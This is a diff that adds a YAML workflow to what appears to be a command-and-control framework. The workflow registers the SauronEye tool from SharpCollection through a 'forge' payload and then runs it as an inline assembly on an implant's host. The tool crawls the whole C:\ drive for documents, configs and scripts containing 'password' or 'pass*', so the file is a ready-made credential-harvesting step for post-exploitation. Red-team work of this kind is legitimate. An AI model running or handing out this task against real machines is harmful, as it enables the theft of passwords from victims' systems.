@@ -1,0 +1,37 @@
+name: "forge_net_SauronEye Enumerate"
+description: "Register and run SauronEye via forge_net"
+trigger: manual
+run_as: self
+
+steps:
+###########################################################
+# SauronEye
+###########################################################
+  - name: "register forge_net_SauronEye"
+    depends_on: []
+    inputs:
+      CALLBACK_ID: env.display_id
+    action: task_create
+    action_data:
+      callback_display_id: CALLBACK_ID
+      command_name: forge_register
+      payload_type: forge
+      params_dictionary:
+        collectionName: SharpCollection
+        commandName: SauronEye
+        remove: false
+
+  - name: "run forge_net_SauronEye"
+    depends_on:
+    - "register forge_net_SauronEye"
+    inputs:
+      CALLBACK_ID: env.display_id
+    action: task_create
+    action_data:
+      callback_display_id: CALLBACK_ID
+      command_name: forge_net_SauronEye
+      payload_type: forge
+      params_dictionary:
+        args: "d C:\\ --filetypes .txt .doc .docx .xls .config .ps1 .vbs .bat --contents --keywords password pass* -v"
+        version: 4.7_Any
+        execution: inline_assembly
